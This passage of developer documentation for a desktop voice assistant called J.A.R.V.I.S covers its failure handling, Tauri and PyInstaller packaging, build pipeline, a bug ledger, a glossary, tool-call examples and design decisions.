                           dead, HUD shows "link severed" instead of
                           hanging in "thinking" state.

  - Tab loses focus     -> Tab refocus event triggers immediate reconnect
                           (visibilitychange listener).

  - System wakes from   -> online event triggers immediate reconnect.
    sleep / network
    restoration

  - Microphone denied   -> Insecure-context detected pre-flight; friendly
                           error shown rather than crashing React.

  - Memory DB corrupt   -> ChromaDB collection auto-rebuilds on next
                           query; the old vectors are lost but the
                           system stays running.

  - Vosk model missing  -> Logged as INFO, local STT silently disables.
                           Cloud STT is the only path; works until the
                           cloud has issues.

  - LLM hits rate limit -> Caught as generic Exception in stream_llm;
                           fallback string streamed; conversation
                           history NOT corrupted.

  - Tool execution      -> Sandbox kills the runaway process via Job
    runs forever           Object timeout (256 MiB / wall-clock cap);
                           truncated output returned.

  - User unplugs mid-   -> CommandChild.kill() is called on Tauri
    response               ExitRequested AND WindowEvent::CloseRequested,
                           so no Python sidecar is left orphaned.

21. FROM WEB APP TO DESKTOP APP -- THE TAURI V2 DECISION
---------------------------------------------------------

Originally, J.A.R.V.I.S was developed as two processes: a Python
FastAPI server and a React dev server, both running locally. Users
would visit http://localhost:3000 in their browser. This was fine for
development but bad for production because:

  - Users have to install Python AND Node AND configure environment
    variables. High friction.

  - Browser tabs are not "apps" -- no taskbar icon, no proper window,
    no offline support.

  - The browser's secure-context rules can block the microphone when
    accessed via IP address rather than localhost.

  - No control over the window: themes, sizes, native menus,
    notifications.

The solution: wrap the whole thing in a NATIVE DESKTOP SHELL. The two
industry-standard options were:

  ELECTRON: bundles a full Chromium browser into the app.
    Pros: mature, lots of examples, everything works.
    Cons: 150+ MB idle memory, 80+ MB installer, slow startup,
          custom child-process bundling for Python.

  TAURI v2: uses the OS's existing webview (Edge WebView2 on Windows)
    and writes the native shell in Rust.
    Pros: ~30-50 MB idle, ~15-25 MB installer, first-class Python
          "sidecar" support, faster startup, stronger security model.
    Cons: requires Rust toolchain to build, less mature ecosystem.

Tauri v2 wins. The trade-off is one-time (we install Rust to build),
the gain is permanent (every end user gets a leaner app).


22. HOW THE PYTHON BACKEND BECOMES A SIDECAR
---------------------------------------------

A "sidecar" in Tauri terminology is a binary that travels alongside
the main Tauri executable inside the installer. When the user clicks
the app icon, the Rust shell launches; the Rust shell spawns the
sidecar; the sidecar starts serving on 127.0.0.1:8000; the Rust shell
waits for /health to respond; only then is the webview window shown.

To produce the sidecar binary, we use PyInstaller. PyInstaller is a
tool that bundles a Python program, the Python interpreter, all its
dependencies, and all required data files into a single .exe.

Our PyInstaller recipe lives at backend/jarvis_core.spec. It declares:
  - main.py as the entry point.
  - All the hidden imports that PyInstaller can't auto-detect (uvicorn
    worker classes, ChromaDB native deps, vosk's model loader, etc.).
  - Metadata files for FastAPI/Pydantic/Groq/Chroma/edge-tts (which
    use importlib.metadata at runtime).
  - data files for chromadb / edge-tts / certifi.
  - Excludes dev-only deps (pytest, mypy, ruff) to keep the binary
    small.
  - Output: jarvis-core.exe (single-file, console enabled so Tauri
    can capture stdout/stderr).

The build script backend/build-sidecar.ps1:
  1. Detects the host architecture (x86_64 / aarch64).
  2. Computes the host triple (e.g., x86_64-pc-windows-msvc).
  3. Runs PyInstaller against the spec.
  4. Renames the output to jarvis-core-<triple>.exe (Tauri's
     convention).
  5. Copies it to src-tauri/binaries/.

When you run `npm run tauri:build`, this script runs first, then Tauri
picks up the binary from `binaries/jarvis-core` (Tauri appends the
host triple suffix automatically).

CRITICAL: when frozen, the Python code can't use __file__ to find
its data directory. PyInstaller extracts everything to a temp dir
(`sys._MEIPASS`) that vanishes between launches. So we centralised
all path logic in core/paths.py:

  - In dev mode: paths resolve to the repo (backend/temp/, repo/vault/,
    etc.) for ease of grep/debug.

  - In frozen mode: paths resolve to platform-native user-data dirs
    (%APPDATA%\J.A.R.V.I.S\ on Windows). This way user data survives
    app updates.

  - All consumers (processor, memory, vault, sandbox) import TEMP_DIR,
    MEMORY_DB_DIR, VAULT_DIR, SANDBOX_RUN_DIR from paths.py -- never
    compute paths themselves.

We also add `multiprocessing.freeze_support()` to main.py so that
PyInstaller's bootloader doesn't accidentally infinite-loop when a
subprocess re-imports the main module (a classic Windows multiprocessing
pitfall).


23. THE BUILD PIPELINE
-----------------------

Here's what happens when you run `npm run tauri:build`:

  STAGE 1: SIDECAR BUILD (backend/build-sidecar.ps1)
    - Activate venv.
    - Run PyInstaller against jarvis_core.spec.
    - Resulting jarvis-core.exe (~60-80 MB) lands in backend/dist/.
    - Rename + copy to src-tauri/binaries/jarvis-core-x86_64-pc-windows-msvc.exe.

  STAGE 2: REACT BUILD (npm run build --prefix frontend)
    - react-scripts builds the production bundle.
    - Output: frontend/build/ (~205 KB gzipped JS + 8.7 KB CSS).
    - This is what gets embedded into the Tauri webview.

  STAGE 3: TAURI BUNDLE (cargo tauri build)
    - Compile src-tauri/ Rust code in release mode (LTO, strip).
    - Embed frontend/build/ as static assets.
    - Embed src-tauri/binaries/jarvis-core-*.exe as the sidecar.
    - Run the NSIS bundler -> src-tauri/target/release/bundle/nsis/
      J.A.R.V.I.S_3.2.0_x64-setup.exe.
    - Run the MSI bundler -> src-tauri/target/release/bundle/msi/
      J.A.R.V.I.S_3.2.0_x64_en-US.msi.

The user double-clicks the installer, accepts the EULA, picks an
install dir, and gets:

27. THE BUG LEDGER (KNOWN ISSUES, PRIORITISED)
-----------------------------------------------

  BUG-01  No server-side timeout on stream_llm. If Groq stream stalls,
          WS coroutine parks indefinitely. Heartbeat catches a fully
          dead connection, but not a slow trickle.
          Fix: asyncio.wait_for(stream_llm(...), timeout=N).

  BUG-02  No client-side tool watchdog. If tool_lifecycle:start arrives
          but :end doesn't (server crash mid-tool), HUD stays in
          "tool_use" until heartbeat reconnects.
          Fix: per-tool 30s timer in useBrain.js.

  BUG-03  Sandbox windows_jobobject backend has a microsecond race
          between Popen and AssignProcessToJobObject. Mitigated by the
          allow-list (no fork-spawners like cmd/powershell/sh allowed).
          Hard fix: rewrite via win32process.CreateProcess + CREATE_SUSPENDED.

  BUG-04  Vosk model dir absence is silent. /health doesn't expose STT
          availability -- only learned about it via the next failed recall.
          Fix: surface in /health endpoint.

  BUG-05  Per-session telemetry psutil cost. Every WS session spawns
          its own 5-second psutil.cpu_percent loop. At N clients, that's
          N samples per 5s.
          Fix: centralise into one asyncio task + fan-out.

  BUG-06  No rate limiting on /ws or REST. One curl loop can drain Groq
          token budget.
          Fix: SlowAPI rate limiter.

  BUG-07  redact() pattern set is incomplete. Misses Anthropic sk-ant-*,
          Google AIza*, AWS AKIA*.
          Fix: extend _SECRET_PATTERNS.

  BUG-08  NexusVault secure-shred is best-effort on SSDs (TRIM + wear
          levelling). Cryptographic shred (forget password) is the
          stronger fallback.
          Fix: documentation-level only.

  BUG-09  No CSRF on NexusVault routes. Same-origin XSS would suffice
          to invoke endpoints.
          Fix: CSRF token tied to unlock session.

  BUG-10  stream_llm catches Exception broadly. Rate-limit, token
          overflow, network drop all look the same to the user.
          Fix: typed handling per groq.* exceptions + structured error frame.

  BUG-11  (FIXED in v3.2) exhaustive-deps was 'off' -- re-enabled.

  BUG-12  Localisation strategy undocumented. Mix of British English
          and Hinglish exception strings in processor.py.

  BUG-13  export_conversation schema lacks "required": ["format"]. Groq
          may emit empty args, falling through to implicit "pdf".

  BUG-14  backend/temp/ purge runs once at boot. Long sessions
          accumulate exports until restart.
          Fix: asyncio task on 10-minute cadence.

29. GLOSSARY (TECHNICAL TERMS DECODED)
---------------------------------------

  AES-256-GCM       -- A specific cipher (Advanced Encryption Standard,
                       256-bit key, Galois Counter Mode). The GCM mode
                       provides BOTH encryption AND authentication, so a
                       tampered ciphertext is detected at decryption time
                       via a 16-byte auth tag.

  ASGI              -- Asynchronous Server Gateway Interface. The async
                       successor to WSGI. FastAPI is an ASGI app; uvicorn
                       is an ASGI server.

  CORS              -- Cross-Origin Resource Sharing. The browser security
                       mechanism that decides which webpages can talk to
                       which API servers. Configured via the
                       ALLOWED_ORIGINS env var.

  CRA               -- Create React App. The default React project
                       scaffolder. Provides `npm start`, `npm run build`,
                       `npm test` out of the box.

  Edge TTS          -- Microsoft's neural text-to-speech engine, exposed
                       as a public service used by Edge's "Read Aloud"
                       feature. The Python `edge-tts` library wraps it.

  ChromaDB          -- An open-source embedded vector database. "Embedded"
                       means it runs in-process -- no separate server like
                       PostgreSQL or Redis. Stores documents + their
                       embeddings + metadata.

  FastAPI           -- A modern async Python web framework. Auto-generates
                       OpenAPI docs from type hints. Built on Starlette.

  Glassmorphism     -- A UI design style: translucent panels with blur
                       and subtle borders, like frosted glass.

  Groq              -- The cloud LLM provider used by JARVIS. Their
                       Llama 3.1 8B Instant model has sub-second
                       time-to-first-token because of their custom
                       "Language Processing Unit" hardware.

  HUD               -- Heads-Up Display. The visual interface.

  JSON              -- JavaScript Object Notation. The standard text
                       format for structured data over the wire.

  KDF               -- Key Derivation Function. Transforms a password
                       (low entropy, human-typed) into a cryptographic
                       key (high entropy, full 256 bits). Slow on purpose
                       to resist brute force.

  LLM               -- Large Language Model. The thing that generates text.

  MP3               -- Audio compression format. The TTS output format.

  PBKDF2-HMAC-SHA256 -- A specific KDF. Iterates SHA-256 thousands of
                        times (we use 100,000) to make brute force
                        computationally expensive.

  PyInstaller       -- A Python tool that packages a Python script + its
                       interpreter + all its dependencies into a single
                       .exe (or single dir).

  RAG               -- Retrieval-Augmented Generation. Pull related
                       context from a database BEFORE asking the LLM,
                       so the LLM has the right grounding.

  React             -- A JavaScript library for building UIs out of
                       reusable components.

  SSE / WebSocket   -- Two ways to push data from server to client.
                       WebSocket is bidirectional + persistent; SSE is
                       one-way + simpler.

  STT               -- Speech-to-Text. Whisper, Vosk.

  Tauri             -- A Rust framework for building cross-platform
                       desktop apps using a webview + native shell. v2
                       is the current major version.

  Three.js          -- JavaScript library for 3D graphics via WebGL.

  TTS               -- Text-to-Speech. Edge Neural, ZipVoice.

  uvicorn           -- The ASGI server that runs FastAPI.

  Vector / Embedding -- A list of floating-point numbers (e.g., 384
                        floats) that represents the meaning of a piece
                        of text. Similar meanings -> similar vectors.

  WebSocket         -- A persistent two-way connection over TCP. The
                       basis of /ws.

  WebView2          -- Microsoft's webview component (Edge engine
                       embedded into native apps). Pre-installed on
                       Win11. Tauri uses it.

  Whisper           -- OpenAI's speech-to-text model. Open weights.
                       The Large V3 Turbo variant is the fastest cloud
                       version.

  Vosk              -- An offline open-source speech-to-text engine.
                       Smaller and less accurate than Whisper, but
                       free and local.

34. THE 12 TOOLS — CONCRETE EXAMPLES
-------------------------------------

Each tool has the same shape: name, JSON-schema args, Python handler.
The LLM picks which one (if any) to call based on your question.
Below is one realistic invocation per tool, showing what the LLM
sends, what the handler returns, and what J.A.R.V.I.S says aloud.

  TOOL 1 — get_system_status
    You say   : "How is the machine doing right now?"
    LLM calls : get_system_status()
    Handler   : reads psutil.cpu_percent, virtual_memory, disk_usage.
    Returns   : {"cpu": 23.4, "ram": 67.1, "disk": 42.3}
    Reply     : "CPU at 23 percent, RAM at 67 percent, disk at 42
                 percent. All systems nominal, sir."

  TOOL 2 — get_time_and_date
    You say   : "What time is it?"
    Handler   : datetime.now().strftime(...)
    Returns   : "Friday, 23 May 2026, 14:37 IST"
    Reply     : "It's 2:37 PM, Friday the 23rd of May."

  TOOL 3 — get_platform_info
    You say   : "What machine am I running on?"
    Handler   : platform.system() + .machine() + sys.version.
    Returns   : {"os": "Windows-11", "arch": "AMD64",
                 "python": "3.11.7"}
    Reply     : "You're on Windows 11, x86 64-bit, with Python 3.11.7."

  TOOL 4 — purge_memory
    You say   : "Forget everything we've talked about."
    Handler   : memory.purge() — drops ChromaDB collection.
    Returns   : {"ok": true, "before": 482, "after": 0}
    Reply     : "Memory wiped, sir. 482 entries removed."

  TOOL 5 — analyze_screen   [VISION TOOL]
    You say   : "What error is on my screen?"
    Handler   : vision.capture() → PIL image → base64 → Groq Llama
                3.2 Vision call.
    Returns   : "A Python TypeError at line 47: 'NoneType has no
                 attribute split'."
    Reply     : "You have a Python TypeError on line 47, sir. The
                 variable on the left of the .split() call is None."

  TOOL 6 — execute_terminal_command   [SANDBOXED]
    You say   : "Show me the git branch."
    LLM calls : execute_terminal_command(command="git branch")
    Handler   : sandbox.run_sandboxed(["git", "branch"]) — allow-list
                checked, Job Object spawned, 8 s wall-clock cap.
    Returns   : "* main\n  feature/vault\n  hotfix/cors"
    Reply     : "You're on main. Two other branches exist:
                 feature/vault and hotfix/cors."

  TOOL 7 — create_file
    You say   : "Make a notes.txt with the word hello."
    Handler   : Path inside SANDBOX_RUN_DIR, UTF-8 write.
    Returns   : {"path": ".sandbox_run/notes.txt", "bytes": 5}
    Reply     : "Created notes.txt in the sandbox, 5 bytes."

  TOOL 8 — search_files
    You say   : "Find all Python files in the backend."
    Handler   : glob inside JARVIS_SANDBOX_ROOT for *.py.
    Returns   : ["backend/main.py", "backend/core/processor.py", ...]
    Reply     : "Found 11 Python files. Shall I list them?"

  TOOL 9 — read_file
    You say   : "Read the first hundred lines of main.py."
    Handler   : resolve_within_sandbox → open() → 1 MiB cap.
    Returns   : "<file contents>"
    Reply     : "main.py imports FastAPI, sets up CORS..." (summary
                 generated by LLM from the bytes).

  TOOL 10 — web_search
    You say   : "What's the latest on Llama 4?"
    Handler   : duckduckgo-search text(q, max_results=5).
    Returns   : List of 5 {title, url, snippet} objects.
    Reply     : "According to recent results, Meta released Llama
                 4 Maverick last week..." (LLM composed from snippets).

  TOOL 11 — get_weather
    You say   : "Weather in Mumbai?"
    Handler   : DuckDuckGo weather lookup.
    Returns   : "Mumbai 32°C partly cloudy humidity 71% wind 12 km/h SW"
    Reply     : "32 degrees and partly cloudy in Mumbai, with 71%
                 humidity and a light south-westerly breeze."

  TOOL 12 — export_conversation
    You say   : "Export this conversation as a PDF."
    Handler   : lazy-import fpdf → render rolling history → write to
                TEMP_DIR/conversation-<ts>.pdf.
    Returns   : {"path": "<TEMP_DIR>/conversation-1716462120.pdf"}
    Reply     : "Done — the PDF is in your temp directory, sir."

To add a 13th tool, the entire workflow is:

  1. Write a handler function in tool_registry.py:
       async def _h_my_new_tool(arg1: str, *, ctx: ToolContext) -> dict:
           ...
           return {"result": ...}

  2. Append one Tool(...) entry to the _TOOLS tuple:
       Tool(
         name="my_new_tool",
         description="Does X.",
         schema={"type": "object", "properties": {...}, "required": [...]},
         handler=_h_my_new_tool,
       )

That's it. Registration is automatic. The next time the server boots,
the LLM is told about my_new_tool via Groq's function-calling spec
and can decide to invoke it when you ask the right question. No
changes to the dispatcher, no changes to the WS handler, no changes
to the HUD.


35. MAJOR ARCHITECTURAL DECISIONS AND THE ALTERNATIVES CONSIDERED
------------------------------------------------------------------

Every major design choice in J.A.R.V.I.S has at least one credible
alternative. Below is the decision ledger — what we picked, what we
considered, why we picked this one. Be your own auditor.

  DECISION 1 — LLM PROVIDER
    Picked   : Groq (Llama 3.1 8B Instant).
    Alts     : OpenAI GPT-4o-mini · Anthropic Claude Haiku · local
               Ollama with Llama 3.2 3B · self-hosted vLLM.
    Why      : Sub-300 ms time-to-first-token because of Groq's LPU
               hardware. For a voice-first UI, TTFT is the single
               most-perceptible latency knob. GPT-4o-mini is smarter
               but ~3x slower TTFT. Local Llama is free but a 3B
               model on consumer hardware tops out at ~2 tok/s — too
               slow for streaming TTS to feel real-time. Ollama runs
               afoul of dependency hell on Windows installer flows.

  DECISION 2 — VECTOR DB
    Picked   : ChromaDB (embedded).
    Alts     : Qdrant · LanceDB · pgvector · Pinecone · FAISS.
    Why      : Embedded — no separate server process, no Docker,
               no auth config. At ~10k–100k turns this is correct.
               When the corpus grows past 100k turns or multi-user
               support lands, migrate to Qdrant or LanceDB
               (upgrade U-19).

  DECISION 3 — STT PRIMARY
    Picked   : Whisper Large V3 Turbo via Groq.
    Alts     : OpenAI Whisper API · AssemblyAI · Deepgram · local
               faster-whisper · Vosk only.
    Why      : Same provider as the LLM (saves a roundtrip), best-
               in-class accuracy, ~300 ms latency. Vosk stays as
               the offline fallback for resilience, not as a primary.

  DECISION 4 — TTS
    Picked   : Microsoft Edge Neural TTS (RyanNeural voice).
    Alts     : ElevenLabs · OpenAI TTS · Coqui TTS · Piper · self-
               hosted ZipVoice.
    Why      : Free, no API key, smooth British-accented male voice
               that matches the Marvel-JARVIS character. ElevenLabs
               sounds better but costs per character. ZipVoice is
               vendored under voice_pack/ as a future upgrade
               (U-16) for full self-hosting.

  DECISION 5 — DESKTOP WRAPPER
    Picked   : Tauri v2 (Rust + WebView2).
    Alts     : Electron · Neutralino · CEF · WebView2 directly via
               C++/C#.
    Why      : ~30–50 MB idle memory vs Electron's 150+ MB. ~15–25
               MB installer vs Electron's 80+ MB. First-class
               sidecar support (matches our Python-backend
               architecture). Strong security model (capability-
               based permissions per command). Trade-off: requires
               the Rust toolchain to build, less mature ecosystem.

  DECISION 6 — CIPHER FOR NEXUSVAULT
    Picked   : AES-256-GCM (via `cryptography` library).
    Alts     : ChaCha20-Poly1305 · AES-CBC + HMAC · libsodium
               secretstream · age.
    Why      : NIST-approved, hardware-accelerated on every modern
               CPU (AES-NI), authenticated encryption built-in
               (16-byte tag detects tampering at decrypt time).
               ChaCha20-Poly1305 would also be fine and is
               sometimes faster on mobile, but on x86-64 with
               AES-NI, GCM wins.

  DECISION 7 — KDF FOR MASTER PASSWORD
    Picked   : PBKDF2-HMAC-SHA256, 100k iterations.
    Alts     : Argon2id · scrypt · bcrypt.
    Why      : PBKDF2 is universally available in `cryptography`
               with no extra deps. Argon2id is the modern best
               choice (memory-hard, GPU-resistant); if the vault
               ever ships outside of personal-use scope, that's the
               upgrade. 100k iterations is the OWASP 2023 minimum.

  DECISION 8 — SANDBOX BACKEND DEFAULT
    Picked   : Auto-detect (Job Object on Windows, hardened fallback).
    Alts     : Always-Docker · always-hardened · WSL · AppContainer.
    Why      : Docker is strongest but requires Docker Desktop —
               a 1.5 GB dependency we can't assume end users have.
               Job Object provides kernel-level limits at zero
               install cost on Windows. Hardened subprocess is the
               last-resort universal fallback. AppContainer (upgrade
               U-17) is the natural next step on Windows.

  DECISION 9 — FRONTEND STATE
    Picked   : React hooks (useState, useReducer, custom hooks).
    Alts     : Redux · Zustand · Jotai · MobX · Recoil.
    Why      : The state is mostly local-to-component plus one big
               WebSocket lifecycle hook (useBrain.js). Redux would
               be ceremony for no benefit; Zustand would be fine
               but adds a dep. Hooks-only keeps the codebase
               idiomatic and the bundle small.

  DECISION 10 — TOOL ROUTING STRATEGY
    Picked   : Two-pass with Groq's native function-calling API.
    Alts     : ReAct prompting · single-pass with embedded tool
               sentinels · DSPy · LangGraph.
    Why      : Two-pass is the simplest correct approach. ReAct
               works but adds 2–3 extra LLM calls per question.
               DSPy and LangGraph (upgrade U-18) become attractive
               when multiple tools must be chained — at one tool
               per turn, they're overkill.
